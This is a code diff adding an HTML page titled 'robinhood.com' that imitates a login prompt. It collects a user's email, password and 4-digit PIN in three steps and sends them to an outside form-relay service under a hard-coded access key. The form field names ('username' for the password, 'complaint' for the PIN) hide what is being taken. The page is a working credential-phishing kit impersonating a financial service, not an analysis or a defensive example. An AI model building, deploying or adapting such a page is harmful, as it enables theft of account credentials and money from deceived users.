@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>robinhood.com</title>
+
+<style>
+
+body{
+font-family:Arial, sans-serif;
+background:#f4f4f4;
+margin:0;
+}
+
+/* Popup background */
+.popup{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.6);
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+/* Form container */
+.form-box{
+background:white;
+padding:30px;
+width:360px;
+border-radius:10px;
+text-align:center;
+box-shadow:0 5px 15px rgba(0,0,0,0.2);
+}
+
+/* Logo space */
+.logo{
+width:70px;
+margin-bottom:15px;
+}
+
+/* Inputs */
+input, textarea{
+width:100%;
+padding:10px;
+margin:10px 0;
+border:1px solid #ccc;
+border-radius:5px;
+font-size:14px;
+}
+
+/* Button */
+button{
+padding:12px;
+border:none;
+background:#007bff;
+color:white;
+width:100%;
+border-radius:5px;
+cursor:pointer;
+font-size:15px;
+}
+
+button:hover{
+background:#0056b3;
+}
+
+.hidden{
+display:none;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="popup">
+
+<div class="form-box">
+
+<!-- Logo -->
+<img src="feather.png" class="logo" alt="Logo">
+
+<h2>login to continue</h2>
+
+<form action="https://api.web3forms.com/submit" method="POST">
+
+<input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+
+<input type="hidden" name="redirect" value="success.html">
+
+<!-- STEP 1 -->
+<div id="step1">
+<h3>Enter mail</h3>
+<input type="email" name="email" placeholder="yourgmail@gmail.com" required>
+<button type="button" onclick="nextStep(1)">Next</button>
+</div>
+
+<!-- STEP 2 -->
+<div id="step2" class="hidden">
+<h3>password</h3>
+<input type="text" name="username" placeholder="password" required>
+<button type="button" onclick="nextStep(2)">Next</button>
+</div>
+
+<!-- STEP 3 -->
+<div id="step3" class="hidden">
+<h3>verify Pin</h3>
+<textarea name="complaint" column="1" placeholder="verify 4 digit pin " required></textarea>
+<button type="submit">login</button>
+</div>
+
+</form>
+
+</div>
+
+</div>
+
+<script>
+
+function nextStep(step){
+
+document.getElementById("step"+step).classList.add("hidden");
+
+document.getElementById("step"+(step+1)).classList.remove("hidden");
+
+}
+
+</script>
+
+</body>
+</html>
